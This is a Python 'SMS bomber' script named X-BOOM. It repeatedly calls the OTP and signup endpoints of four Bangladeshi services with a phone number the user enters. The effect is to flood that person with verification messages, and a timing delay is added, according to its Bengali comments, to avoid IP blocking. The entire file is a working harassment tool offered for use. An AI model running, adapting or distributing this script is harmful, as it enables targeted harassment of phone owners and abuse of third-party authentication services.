import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("     Status: 4 POWER-API ACTIVE         ")
    print("========================================")

def send_sms(target, count):
    # আমি এখানে অন্যের টুল থেকে পাওয়া সচল ৪টি API বসিয়ে দিয়েছি
    apis = [
        {"url": "https://api.redx.com.bd/v1/user/signup", "data": {"phone": target}},
        {"url": "https://member-gateway.daraz.com.bd/membership/gw/otp/send", "data": {"phoneNumber": target, "otpType": "LOGIN"}},
        {"url": "https://api.fundesh.com.bd/api/auth/send-otp", "data": {"phoneNumber": target, "service": "LOGIN"}},
        {"url": "https://bd.bikroy.com/api/customer/otp", "data": {"mobile": target}}
    ]
    
    headers = {"User-Agent": "Mozilla/5.0"}

    print(f"\n[+] Attack started on: {target}")
    for i in range(count):
        # এই লুপটি একে একে সব API ব্যবহার করবে
        api = apis[i % len(apis)] 
        try:
            r = requests.post(api["url"], json=api["data"], headers=headers, timeout=5)
            if r.status_code == 200:
                print(f"[!] SMS {i+1} sent successfully!")
            else:
                print(f"[?] SMS {i+1} failed (Server Busy)")
        except:
            print(f"[-] Error at SMS {i+1}")
        
        time.sleep(3) # ৩ সেকেন্ড বিরতি দিলে আপনার আইপি ব্লক হবে না

def main():
    banner()
    print("\n[1] Start X-BOOM Bomber")
    print("[2] Exit")
    choice = input("\nSelect: ")
    if choice == '1':
        number = input("Number (01xxxxxxxxx): ")
        amount = int(input("Amount: "))
        send_sms(number, amount)
        print("\n[+] Task Completed!")
    else: exit()

if __name__ == "__main__":
    main()


